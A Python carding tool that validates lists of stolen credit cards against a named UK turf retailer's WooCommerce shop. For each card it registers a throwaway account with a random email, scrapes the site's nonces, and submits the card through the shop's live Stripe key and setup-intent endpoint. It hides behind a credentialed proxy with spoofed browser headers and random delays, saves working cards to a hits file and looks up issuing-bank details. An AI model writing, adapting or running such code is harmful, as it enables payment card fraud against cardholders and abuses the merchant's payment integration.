import aiohttp
import asyncio
import random
import string
from datetime import datetime
from aiohttp_socks import ProxyConnector
import os
import json


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"


def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
    letters = string.ascii_lowercase
    username = "".join(random.choice(letters) for i in range(10))
    domain = random.choice(domains)
    return f"{username}@{domain}"


async def get_bin_details(cc_number):
    """Fetch BIN details from AntiPublic API"""
    bin_number = cc_number[:6]
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    return data
                else:
                    print(f"✗ BIN API returned status: {response.status}")
                    return None
    except Exception as e:
        print(f"✗ BIN API error: {e}")
        return None


async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
    max_retries=3
):
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.request(
                method,
                url,
                params=params,
                headers=headers,
                data=data,
                json=json,
                timeout=timeout
            ) as response:
                text = await response.text()
                print(f"✓ Request {method} {url} - Status: {response.status}")
                if response.status != 200:
                    print(f"⚠️  Non-200 response: {text[:200]}...")
                return text, response.status
        except asyncio.TimeoutError:
            print(f"✗ Request timeout (attempt {attempt + 1}/{max_retries})")
            if attempt == max_retries - 1:
                return None, 0
            await asyncio.sleep(2)
        except Exception as e:
            print(f"✗ Request error (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                return None, 0
            await asyncio.sleep(2)
    return None, 0


def save_success_card(card_data):
    """Save successful card to file"""
    with open("Hits_cc_st.txt", "a") as f:
        f.write(card_data + "\n")
    print(f"✓ Saved successful card: {card_data}")


def read_cc_file(file_path):
    """Read and validate CC file"""
    if not os.path.exists(file_path):
        print(f"✗ File not found: {file_path}")
        return None
    
    cards = []
    with open(file_path, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if line and '|' in line:
                parts = line.split('|')
                if len(parts) >= 4:
                    cards.append(line)
                else:
                    print(f"✗ Invalid format on line {line_num}: {line}")
            elif line:
                print(f"✗ Invalid format on line {line_num}: {line}")
    
    print(f"✓ Loaded {len(cards)} valid cards from {file_path}")
    return cards


async def test_proxy_connection(proxy_url):
    """Test if proxy is working"""
    print("🔍 Testing proxy connection...")
    test_url = "https://httpbin.org/ip"
    
    try:
        connector = ProxyConnector.from_url(proxy_url)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(test_url) as response:
                if response.status == 200:
                    ip_info = await response.json()
                    print(f"✓ Proxy working! IP: {ip_info.get('origin', 'Unknown')}")
                    return True
                else:
                    print(f"✗ Proxy test failed: Status {response.status}")
                    return False
    except Exception as e:
        print(f"✗ Proxy connection error: {e}")
        return False


async def process_single_card(card_data, session, results):
    """Process a single credit card"""
    cc, mon, year, cvv = card_data.split('|')[:4]
    year = year[-2:] if len(year) == 4 else year
    
    print(f"\n{'='*60}")
    print(f"🔄 Processing card: {cc}|{mon}|{year}|{cvv}")
    print(f"{'='*60}")

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=0, i",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    }

    # Step 1: Get account page
    print("📄 Step 1: Loading account page...")
    req, status = await make_request(
        session,
        url="https://www.georgedaviesturf.co.uk/my-account",
        method="GET",
        headers=headers,
    )
    
    if req is None or status != 200:
        print(f"✗ Failed to load account page. Status: {status}")
        if req and len(req) > 100:
            print(f"📄 Page content (first 500 chars): {req[:500]}")
        results["failed"] += 1
        return False
    
    # Enhanced nonce parsing with multiple attempts
    nonce = parseX(req, 'name="woocommerce-register-nonce" value="', '"')
    if nonce == "None":
        # Try alternative patterns
        nonce = parseX(req, 'woocommerce-register-nonce" value="', '"')
        if nonce == "None":
            nonce = parseX(req, 'register-nonce" value="', '"')
    
    print(f"🔑 Register Nonce: {nonce if nonce != 'None' else 'NOT FOUND'}")
    
    if nonce == "None":
        print("❌ CRITICAL: Could not find register nonce. Possible issues:")
        print("   - Site is blocking requests")
        print("   - Proxy is detected/banned")
        print("   - Site structure changed")
        results["failed"] += 1
        return False

    await asyncio.sleep(1)

    # Step 2: Register account
    print("👤 Step 2: Registering account...")
    headers2 = headers.copy()
    headers2.update({
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.georgedaviesturf.co.uk",
        "referer": "https://www.georgedaviesturf.co.uk/my-account",
    })
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    random_email = generate_random_email()
    data2 = {
        "email": random_email,
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_referrer": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://www.georgedaviesturf.co.uk/my-account",
        "wc_order_attribution_session_start_time": f"{current_time}",
        "wc_order_attribution_session_pages": "1",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register",
    }

    req2, status2 = await make_request(
        session,
        "https://www.georgedaviesturf.co.uk/my-account/",
        headers=headers2,
        data=data2,
    )
    
    if req2 is None or status2 != 200:
        print(f"✗ Failed to register account. Status: {status2}")
        results["failed"] += 1
        return False
        
    if "Registration complete" in req2 or "My Account" in req2:
        print(f"✓ Account registered successfully: {random_email}")
    else:
        print("⚠️  Account registration may have failed")
        
    await asyncio.sleep(1)

    # Step 3: Get payment method page
    print("💳 Step 3: Loading payment method page...")
    req3, status3 = await make_request(
        session,
        url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
        method="GET",
        headers=headers,
    )
    
    if req3 is None or status3 != 200:
        print(f"✗ Failed to load payment method page. Status: {status3}")
        results["failed"] += 1
        return False
        
    await asyncio.sleep(2)
    
    # Parse payment nonces
    addpmnonce = parseX(req3, 'name="woocommerce-add-payment-method-nonce" value="', '"')
    rest_nonce = parseX(req3, '"createAndConfirmSetupIntentNonce":"', '"')
    
    print(f"🔑 Payment Method Nonce: {addpmnonce if addpmnonce != 'None' else 'NOT FOUND'}")
    print(f"🔑 REST API Nonce: {rest_nonce if rest_nonce != 'None' else 'NOT FOUND'}")
    
    if rest_nonce == "None":
        print("❌ CRITICAL: Could not find REST API nonce")
        results["failed"] += 1
        return False

    # Step 4: Create payment method with Stripe
    print("🔄 Step 4: Creating Stripe payment method...")
    headers4 = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    }

    # Convert JSON data to form data
    form_data4 = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": year,
        "card[exp_month]": mon,
        "allow_redisplay": "unspecified",
        "billing_details[address][postal_code]": "99501",
        "billing_details[address][country]": "US",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/04e5b47d27; stripe-js-v3/04e5b47d27; payment-element; deferred-intent",
        "referrer": "https://www.georgedaviesturf.co.uk",
        "time_on_page": "2362",
        "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
        "_stripe_version": "2024-06-20",
    }
    
    req4, status4 = await make_request(
        session,
        url="https://api.stripe.com/v1/payment_methods",
        headers=headers4,
        data=form_data4,
    )
    
    if req4 is None:
        print("✗ Failed to create payment method")
        results["failed"] += 1
        return False
        
    print(f"📋 Stripe Response: {req4[:200]}...")
    
    pmid = parseX(req4, '"id": "', '"')
    if pmid == "None":
        print("✗ Failed to get payment method ID")
        # Check for error message
        error_msg = parseX(req4, '"message": "', '"')
        if error_msg != "None":
            print(f"✗ Stripe Error: {error_msg}")
        results["failed"] += 1
        return False
        
    print(f"✅ Payment Method ID: {pmid}")

    # Step 5: Confirm setup intent
    print("🔐 Step 5: Confirming setup intent...")
    headers5 = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.georgedaviesturf.co.uk",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    
    data5 = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pmid,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": rest_nonce,
    }
    
    req5, status5 = await make_request(
        session,
        url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
        headers=headers5,
        data=data5,
    )

    if req5 is None:
        print("✗ Failed to confirm setup intent")
        results["failed"] += 1
        return False

    print(f"📋 Final Response: {req5}")

    if "succeeded" in req5:
        print("🎉 Card Added Successfully!")
        save_success_card(card_data)
        
        # Get BIN details for display only
        print("📡 Fetching BIN details...")
        bin_details = await get_bin_details(cc)
        if bin_details and 'bin' in bin_details:
            bin_info = bin_details['bin']
            bank = bin_info.get('bank', {}).get('name', 'Unknown Bank')
            country = bin_info.get('country', {}).get('name', 'Unknown Country')
            brand = bin_info.get('brand', 'Unknown')
            print(f"🏦 Bank: {bank}")
            print(f"🇺🇳 Country: {country}")
            print(f"💳 Brand: {brand}")
        else:
            print("ℹ️  BIN details not available")
        
        results["success"] += 1
        return True
    elif "requires_action" in req5:
        print("⚠️ STRIPE 3DS2 Authentication Required")
        results["3ds"] += 1
        return False
    elif "error" in req5 or "declined" in req5:
        error_resp = parseX(req5, '"message":"', '"')
        if error_resp == "None":
            error_resp = parseX(req5, "'message':'", "'")
        print(f"✗ Stripe Error: {error_resp if error_resp != 'None' else req5}")
        results["failed"] += 1
        return False
    else:
        print(f"✗ Unknown response: {req5}")
        results["failed"] += 1
        return False


async def stripe_auth_batch():
    """Process multiple cards from a file"""
    
    # Ask for CC file path
    file_path = input("Enter the path to your CC file: ").strip().strip('"')
    
    # Read CC file
    cards = read_cc_file(file_path)
    if not cards:
        return
    
    # Initialize results counter
    results = {"success": 0, "failed": 0, "3ds": 0, "total": len(cards)}
    
    print(f"\nStarting to process {len(cards)} cards...")
    
    # Proxy configuration
    proxy_url = "http://89565483-zone-custom:M5o5HIxR@na.proxys5.net:6200"
    
    # Test proxy first
    proxy_working = await test_proxy_connection(proxy_url)
    if not proxy_working:
        print("❌ Proxy test failed. Trying without proxy...")
        connector = None
    else:
        connector = ProxyConnector.from_url(proxy_url)
    
    print("="*60)
    
    # Clear previous hits file
    if os.path.exists("Hits_cc_st.txt"):
        os.remove("Hits_cc_st.txt")
        print("✓ Cleared previous Hits_cc_st.txt")
    
    # Process cards sequentially
    async with aiohttp.ClientSession(connector=connector, trust_env=True) as session:
        for i, card in enumerate(cards, 1):
            print(f"\n📦 Processing card {i}/{len(cards)}")
            
            success = await process_single_card(card, session, results)
            
            # Add delay between cards
            if i < len(cards):
                delay = random.randint(5, 10)
                print(f"⏳ Waiting {delay} seconds before next card...")
                await asyncio.sleep(delay)
    
    # Print final results
    print(f"\n{'='*60}")
    print("🎯 PROCESSING COMPLETE")
    print(f"{'='*60}")
    print(f"✅ Successful: {results['success']}")
    print(f"⚠️  3DS Required: {results['3ds']}")
    print(f"❌ Failed: {results['failed']}")
    print(f"📊 Total Processed: {results['total']}")
    print(f"💾 Successful cards saved to: Hits_cc_st.txt")
    print(f"{'='*60}")


def validate_cc_format(cc_text):
    """Validate CC format for Telegram bot"""
    try:
        parts = cc_text.split('|')
        if len(parts) < 4:
            return False
        
        cc, mon, year, cvv = parts[:4]
        
        # Basic validation
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return False
        
        if not mon.isdigit() or not (1 <= int(mon) <= 12):
            return False
            
        if not year.isdigit() or len(year) not in [2, 4]:
            return False
            
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return False
            
        return True
    except:
        return False


async def telegram_bot_mode():
    """Run in Telegram bot mode"""
    print("🤖 Starting in Telegram Bot Mode...")
    print("This mode requires BOT_TOKEN environment variable")
    print("Bot will process CCs sent via Telegram messages")
    
    # For now, fall back to file mode
    print("❌ Telegram bot mode not configured. Switching to file mode...")
    await stripe_auth_batch()


if __name__ == "__main__":
    # Install required package if not already installed
    try:
        import aiohttp_socks
    except ImportError:
        print("Installing required package: aiohttp-socks")
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp-socks"])
        import aiohttp_socks
    
    # Check if running as Telegram bot or file processor
    if len(sys.argv) > 1 and sys.argv[1] == "--telegram":
        asyncio.run(telegram_bot_mode())
    else:
        # Run the batch processor (file mode)
        asyncio.run(stripe_auth_batch())
